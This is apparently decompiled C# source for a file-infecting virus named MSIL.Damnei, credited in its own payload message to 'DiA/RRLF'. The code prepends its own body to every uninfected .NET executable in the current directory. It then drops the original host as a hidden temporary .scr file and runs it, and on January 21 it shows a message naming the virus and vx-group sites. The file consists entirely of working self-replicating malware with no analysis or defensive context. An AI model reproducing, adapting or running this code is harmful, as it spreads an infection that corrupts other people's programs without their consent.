using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Windows.Forms;

namespace FirstPrep;

public class DamneiVirus
{
	public void Start()
	{
		//IL_0259: Unknown result type (might be due to invalid IL or missing references)
		//IL_027e: Unknown result type (might be due to invalid IL or missing references)
		int num = 20480;
		int num2 = 8422;
		string fileName = Process.GetCurrentProcess().MainModule!.FileName;
		byte[] array = new byte[20480];
		FileStream fileStream = new FileStream(fileName, FileMode.Open, FileAccess.Read);
		BinaryReader binaryReader = new BinaryReader(fileStream);
		for (int i = 0; i < num; i++)
		{
			array[i] = binaryReader.ReadByte();
		}
		byte[] array2 = new byte[fileStream.Length - num];
		int num3 = 0;
		try
		{
			while (true)
			{
				array2[num3] = binaryReader.ReadByte();
				num3++;
			}
		}
		catch (EndOfStreamException)
		{
		}
		binaryReader.Close();
		fileStream.Close();
		string[] files = Directory.GetFiles(Directory.GetCurrentDirectory(), "*.exe");
		string[] array3 = files;
		foreach (string text in array3)
		{
			try
			{
				AssemblyName.GetAssemblyName(text);
			}
			catch (BadImageFormatException)
			{
				continue;
			}
			try
			{
				FileStream fileStream2 = new FileStream(text, FileMode.Open, FileAccess.Read);
				BinaryReader binaryReader2 = new BinaryReader(fileStream2);
				byte[] array4 = new byte[fileStream2.Length];
				num3 = 0;
				try
				{
					while (true)
					{
						array4[num3] = binaryReader2.ReadByte();
						num3++;
					}
				}
				catch (EndOfStreamException)
				{
				}
				if (array[num2] == array4[num2])
				{
					binaryReader2.Close();
					fileStream2.Close();
					continue;
				}
				binaryReader2.Close();
				fileStream2.Close();
				fileStream2 = new FileStream(text, FileMode.Open, FileAccess.Write);
				BinaryWriter binaryWriter = new BinaryWriter(fileStream2);
				for (int k = 0; k < num; k++)
				{
					binaryWriter.BaseStream.WriteByte(array[k]);
				}
				for (int l = 0; l < array4.Length; l++)
				{
					binaryWriter.BaseStream.WriteByte(array4[l]);
				}
				binaryWriter.Close();
				fileStream2.Close();
			}
			catch (Exception)
			{
			}
		}
		Random random = new Random(DateTime.Now.Millisecond);
		string text2 = "temp" + random.Next(10000) + ".scr";
		fileStream = new FileStream(text2, FileMode.Create, FileAccess.Write);
		BinaryWriter binaryWriter2 = new BinaryWriter(fileStream);
		for (int m = 0; m < array2.Length; m++)
		{
			binaryWriter2.BaseStream.WriteByte(array2[m]);
		}
		binaryWriter2.Close();
		fileStream.Close();
		File.SetAttributes(text2, FileAttributes.Hidden);
		if (DateTime.Now.Month == 1 && DateTime.Now.Day == 21)
		{
			MessageBox.Show("http://www.vx-dia.de.vu/ - http://www.rrlf.de.vu/", "Infected with MSIL.Damnei by DiA/RRLF");
		}
		try
		{
			Process.Start(text2).WaitForExit();
		}
		catch (Exception)
		{
			MessageBox.Show("Can not execute " + fileName, "Error");
		}
		File.Delete(text2);
	}
}
